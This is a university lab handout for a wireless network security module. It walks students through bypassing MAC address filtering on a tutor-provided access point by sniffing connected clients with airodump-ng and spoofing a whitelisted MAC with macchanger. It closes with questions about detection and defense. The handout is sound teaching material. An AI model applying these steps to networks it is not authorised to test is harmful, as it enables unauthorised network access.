## Module Code: 6CSEF005W  
**Module name:** Wireless Network Security  
**Lab activity:** Bypassing MAC Address Filtering  
**Author:** Dr Ayman El Hajjar  

---

# Lab Activity: Bypassing MAC Filters on a Wireless Network

---

### Objective

In this lab, you will explore MAC address filtering and learn how to bypass it by identifying and spoofing the MAC address of an authorised device using common wireless security tools.

---

## Background

MAC filtering is an outdated form of access control. It attempts to restrict which devices can connect based on their MAC address. However, since MAC addresses are sent in cleartext during normal wireless communication, they are easily spoofed.

---

## Lab Requirements

- An access point configured with MAC filtering enabled  
  - This is provided in the class by the tutor using `setup_open_ap_macfilter.sh`
- At least one client device connected to the target AP
- Kali Linux or equivalent with:
  - `aircrack-ng`
  - `macchanger`
  - `nmcli` or GUI network manager

---

## Step-by-Step Instructions

### 1. Observe Normal Client Behavior

Before spoofing, attempt to connect to the AP using your default MAC address.

```bash
nmcli dev wifi connect "6CSEF005W_macfilter_ap" ifname lab-wlan
```

> This should fail if your MAC is not whitelisted.

---

### 2. Enable Monitor Mode Temporarily (Optional)

If you want to inspect traffic:

```bash
sudo ip link set lab-wlan down
sudo iw dev lab-wlan set type monitor
sudo ip link set lab-wlan up
```

Then run:

```bash
sudo airodump-ng lab-wlan
```

---

### 3. Reset Interface to Managed Mode

Return to a state where you can attempt to connect:

```bash
sudo ip link set lab-wlan down
sudo iw dev lab-wlan set type managed
sudo ip link set lab-wlan up
```

---

### 4. Discover Target Clients (If Monitor Mode Available)

```bash
sudo airmon-ng start lab-wlan
sudo airodump-ng -c <channel> --bssid <AP_BSSID> -a lab-wlanmon
```

> Look under "STATION" to find connected client MACs.

---

### 5. Spoof a Whitelisted MAC

```bash
sudo ip link set lab-wlan down
sudo macchanger -m <WHITELISTED_MAC> lab-wlan
sudo ip link set lab-wlan up
```

---

### 6. Attempt to Connect

```bash
nmcli dev wifi connect "6CSEF005W_macfilter_ap" ifname lab-wlan
```

> You should now connect successfully if the spoofed MAC is in the whitelist.

---

## Discussion Points

- Why is MAC filtering ineffective as a security measure?
- Could this technique work if the AP also uses WPA2-Enterprise?
- How might detection systems spot spoofed MAC addresses?
- How can the presence of duplicate MACs be detected on a network?

---

## Optional Screenshots

Save in `tasks/img/`:
- Airodump-ng output showing MACs
- macchanger before/after
- Connection attempt (failed and spoofed success)

---

## Summary Table

| Step       | Tool             | Purpose                          |
|------------|------------------|----------------------------------|
| Probe      | `airodump-ng`    | Discover client MACs             |
| Spoof      | `macchanger`     | Impersonate whitelisted MAC      |
| Connect    | `nmcli`          | Access AP using spoofed MAC      |

---
